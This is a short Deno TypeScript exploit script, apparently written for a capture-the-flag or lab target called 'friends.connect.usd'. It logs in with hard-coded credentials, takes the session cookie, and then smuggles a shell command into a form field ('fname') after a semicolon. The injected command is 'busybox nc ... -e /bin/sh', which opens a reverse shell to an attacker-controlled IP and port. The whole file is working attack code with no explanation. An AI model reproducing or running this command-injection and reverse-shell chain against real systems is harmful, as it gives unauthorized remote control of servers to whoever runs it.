// Run with `deno run --allow-net --unstable revshell.ts`

export {};
const client = Deno.createHttpClient({ allowHost: true });

// Stage 1: login
const user = "john";
const password = "1VeryS3cure2023";
const hostIp = "10.2.17.8";

const revshellIp = "10.1.0.88";
const revshellPort = "9001";

const loginResult = await fetch(`http://${hostIp}/login.php`, {
  headers: {
    Host: "friends.connect.usd",
    "content-type": "application/x-www-form-urlencoded",
  },
  body: `Username=${user}&Password=${password}&Submit=Login`,
  method: "POST",
  redirect: "manual",
  client,
});

const loginCookie = loginResult.headers.get("set-cookie")?.split(";")[0];
console.log("Your cookie is:", loginCookie);

// Stage 2: open reverse shell

const payload = `busybox nc ${revshellIp} ${revshellPort} -e "/bin/sh"`;

const result = await fetch(`http://${hostIp}/index.php`, {
  headers: {
    Host: "friends.connect.usd",
    "content-type": "application/x-www-form-urlencoded",
    Cookie: loginCookie ?? "",
  },
  body: `fname= you cuddly cat! I started a revshell to ${revshellIp}:${revshellPort};${payload}&sent=Submit`,
  method: "POST",
  redirect: "manual",
  client,
});

console.log(await result.text());
